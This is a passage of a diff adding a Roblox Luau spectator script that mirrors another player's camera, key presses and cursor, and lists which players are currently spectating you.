+	k.Position = UDim2.fromOffset(x,y)
+	k.BackgroundColor3 = CFG.Color.Soft
+	k.TextColor3 = CFG.Color.Fg
+	k.Font = Enum.Font.GothamBold
+	k.TextSize = 14
+	k.Text = txt
+	k.Parent = keypad
+	Instance.new("UICorner",k).CornerRadius = UDim.new(0,6)
+	return k
+end
+
+local keyW = makeKey(82, 0, "W")
+local keyA = makeKey(40, 34, "A")
+local keyS = makeKey(82, 34, "S")
+local keyD = makeKey(124, 34, "D")
+local mL  = makeKey(0,  68, "L")
+local mM  = makeKey(82, 68, "M")
+local mR  = makeKey(164,68, "R")
+local keyMap = {W=keyW,A=keyA,S=keyS,D=keyD,Left=mL,Middle=mM,Right=mR}
+
+local function pulseKey(k,active)
+	local target = active and CFG.KeyActive or CFG.Color.Soft
+	TweenService:Create(k, TweenInfo.new(CFG.KeyTweenDur), {BackgroundColor3=target}):Play()
+end
+
+--// =====================================================================================
+--// CURSOR DOT — white by default, flashes red on Left click; ignores Right
+--// =====================================================================================
+local dot = Instance.new("Frame")
+dot.Size = UDim2.fromOffset(8, 8)
+dot.AnchorPoint = Vector2.new(0.5,0.5)
+dot.BackgroundColor3 = CFG.Color.White
+dot.BackgroundTransparency = 0.1
+dot.Visible = false
+dot.ZIndex = 10
+dot.Parent = gui
+Instance.new("UICorner",dot).CornerRadius = UDim.new(1,0)
+
+local flashCooldown = 0
+
+--=== HELPERS ===
+local function getHRP(plr)
+	if not plr or not plr.Character then return nil end
+	return plr.Character:FindFirstChild("HumanoidRootPart")
+end
+local function nodeFor(p)
+	if not (Root and p) then return nil end
+	return Root:FindFirstChild(p.Name)
+end
+local function camVal(p)
+	local n=nodeFor(p)
+	if not n then return nil end
+	local c=n:FindFirstChild("Camera")
+	return c and c.Value or nil
+end
+local function camMatch(a,b)
+	if not (a and b) then return false end
+	local d=(a.Position-b.Position).Magnitude
+	local posOk=d<=CFG.Match.PosEPS*(1+d/20)
+	local dotv=a.LookVector:Dot(b.LookVector)
+	return posOk and dotv>=CFG.Match.AngEPSDot
+end
+
+--=== CORE STATE ===
+local spectating,currentTarget=false,nil
+local list,idx={},0
+local WatcherCache={}
+local prevList={}
+
+--=== WATCHERS LIST UPDATE (who's watching YOU) ===
+local function whoWatchingYou()
+	local now=tick()
+	local tgt=LP
+	local cached=WatcherCache[tgt]
+	if cached and now-cached.t<1 then return cached.l end
+
+	local arr={}
+	local myCF=camVal(tgt)
+	for _,p in ipairs(Players:GetPlayers()) do
+		if p~=tgt then
+			local theirCF=camVal(p)
+			if camMatch(theirCF,myCF) then
+				table.insert(arr,p.Name)
+			end
+		end
+	end
+	table.sort(arr,function(a,b) return a:lower()<b:lower() end)
+	WatcherCache[tgt]={l=arr,t=now}
+	return arr
+end
+
+local function renderWatchingList(l)
+	if #l==#prevList then
+		local same=true
+		for i,v in ipairs(l) do if v~=prevList[i] then same=false break end end
+		if same then return end
+	end
+	title.Text=("👁  Spectators: %d"):format(#l)
+	for _,c in ipairs(listHolder:GetChildren()) do
+		if c:IsA("TextLabel") then c:Destroy() end
+	end
+	for _,n in ipairs(l) do
+		local row=Instance.new("TextLabel")
+		row.Size=UDim2.new(1,-4,0,22)
+		row.BackgroundTransparency=1
+		row.TextXAlignment=Enum.TextXAlignment.Left
+		row.Font=Enum.Font.Gotham
+		row.TextColor3=CFG.Color.Fg
+		row.TextSize=13
+		row.Text="  • "..n
+		row.Parent=listHolder
+	end
+	prevList=l
+end
+
+task.spawn(function()
+	while task.wait(1/CFG.UpdateHz) do
+		renderWatchingList(whoWatchingYou())
+	end
+end)
+
+--=== TARGET SYSTEM ===
+local function sortedOthers()
+	local arr={}
+	for _,p in ipairs(Players:GetPlayers()) do if p~=LP then table.insert(arr,p) end end
+	table.sort(arr,function(a,b)
+		local A=getHRP(a) local B=getHRP(b)
+		local my=LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+		if not (A and B and my) then return (a.Name < b.Name) end
+		return (A.Position-my.Position).Magnitude < (B.Position-my.Position).Magnitude
+	end)
+	return arr
+end
+
+local function closest()
+	local best,bestD
+	local myHRP=getHRP(LP)
+	if not myHRP then return nil end
+	for _,p in ipairs(Players:GetPlayers()) do
+		if p~=LP then
+			local hrp=getHRP(p)
+			if hrp then
+				local d=(hrp.Position-myHRP.Position).Magnitude
+				if not bestD or d<bestD then best,bestD=p,d end
+			end
+		end
+	end
+	return best
+end
+
+local function setLabelTarget(p)
+	lbl.Text = p and ("Spectating: "..p.Name) or "Spectating: —"
+end
+local function setSpectateUIVisible(v)
+	controlWrap.Visible = v
+	keypad.Visible = v
+	dot.Visible = v
+end
+
+local function resetSelf()
+	local ch=LP.Character or LP.CharacterAdded:Wait()
+	local hum=ch:FindFirstChildWhichIsA("Humanoid")
+	if hum then
+		Camera.CameraType=Enum.CameraType.Custom
+		Camera.CameraSubject=hum
+	end
+	currentTarget=nil
+	spectating=false
+	setLabelTarget(nil)
+	setSpectateUIVisible(false)
+	-- restore dot color
+	dot.BackgroundColor3 = CFG.Color.White
+end
+
+local function watch(plr)
+	if not plr then return end
+	currentTarget=plr
+	spectating=true
+	Camera.CameraType=Enum.CameraType.Scriptable
+	setLabelTarget(plr)
+	setSpectateUIVisible(true)
+end
+
+local function nextTarget(delta)
+	if #list==0 then list=sortedOthers() end
+	if #list==0 then return end
+	idx += delta
+	if idx>#list then idx=1 end
+	if idx<1 then idx=#list end
+	watch(list[idx])
+end
+
+btnNext.MouseButton1Click:Connect(function() if spectating then nextTarget(1) end end)
+btnPrev.MouseButton1Click:Connect(function() if spectating then nextTarget(-1) end end)
+
+--=== ONE-KEY TOGGLE (N) ===
+UserInputService.InputBegan:Connect(function(i,gp)
+	if gp then return end
+	if i.KeyCode==Enum.KeyCode.N then
+		if spectating then
+			resetSelf()
+		else
+			list=sortedOthers()
+			local c=closest() or list[1]
+			idx=1
+			for i2,p in ipairs(list) do if p==c then idx=i2 break end end
+			watch(c)
+		end
+	end
+end)
+
+--=== CAMERA FOLLOW + KEYPAD + CURSOR DOT LOOP ===
+RunService.RenderStepped:Connect(function()
+	if not spectating or not currentTarget then return end
+
+	local node=nodeFor(currentTarget)
+	if node then
+		-- Camera sync
+		local cam=node:FindFirstChild("Camera")
+		local fov=node:FindFirstChild("FieldOfView")
+		if cam and fov then
+			Camera.CFrame = Camera.CFrame:Lerp(cam.Value, CFG.LerpAlpha)
+			Camera.FieldOfView = fov.Value
+		end
+
+		-- Keypad updates
+		for name,label in pairs(keyMap) do
+			local bv=node:FindFirstChild(name)
+			pulseKey(label, bv and bv.Value)
+		end
+
+		-- Cursor dot: project MousePos to screen; white → flash red on Left
+		local m=node:FindFirstChild("MousePos")
+		if m and typeof(m.Value)=="Vector3" then
+			local v=Camera:WorldToViewportPoint(m.Value)
+			if v.Z>0 then
+				dot.Position=UDim2.fromOffset(v.X, v.Y)
+				dot.Visible=true
+			else
+				dot.Visible=false
+			end
+		else
+			dot.Visible=false
+		end
+
+		-- Flash red on left click (ignore right)
+		local left=node:FindFirstChild("Left")
+		if left and left.Value and tick()>flashCooldown then
+			dot.BackgroundColor3 = CFG.Color.Red
+			flashCooldown = tick() + 0.1
+		else
+			-- Smoothly fade back to white
+			dot.BackgroundColor3 = dot.BackgroundColor3:lerp(CFG.Color.White, 0.25)
+		end
+	end
+end)
+
+resetSelf()
